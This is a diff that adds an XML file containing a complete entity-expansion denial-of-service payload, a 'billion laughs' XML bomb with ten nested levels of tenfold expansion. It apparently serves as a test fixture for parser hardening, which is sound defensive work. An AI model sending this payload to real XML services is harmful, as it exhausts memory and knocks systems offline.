@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY long "A very long string that will be repeated many times. This is designed to consume memory when expanded multiple times. The string is intentionally made long to ensure significant memory impact when multiplied. This pattern will be repeated thousands of times to simulate a DoS attack through memory exhaustion. Each repetition will add to the total memory footprint of the document.">
+    <!ENTITY a "&long;&long;&long;&long;&long;&long;&long;&long;&long;&long;">
+    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+    <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+    <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+    <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+    <!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+    <!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">
+]>
+<data>&j;</data> 
